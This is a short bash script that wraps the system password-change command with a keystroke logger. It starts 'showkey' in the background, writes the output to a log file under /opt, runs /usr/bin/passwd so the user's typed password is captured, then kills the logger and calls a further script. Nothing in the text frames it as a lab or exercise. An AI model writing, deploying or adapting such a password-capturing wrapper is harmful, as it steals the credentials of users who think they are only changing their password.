#!/bin/bash

FOLDER="kelompokkucing"
showkey > /opt/$FOLDER/logger.txt &

/usr/bin/passwd
let counter=0
for TARGET in $(ps aux | grep showkey);do
    if [[ $counter = 1 ]]
    then
        kill $TARGET
    fi
    ((counter++))
done
# 
/opt/$FOLDER/function.sh
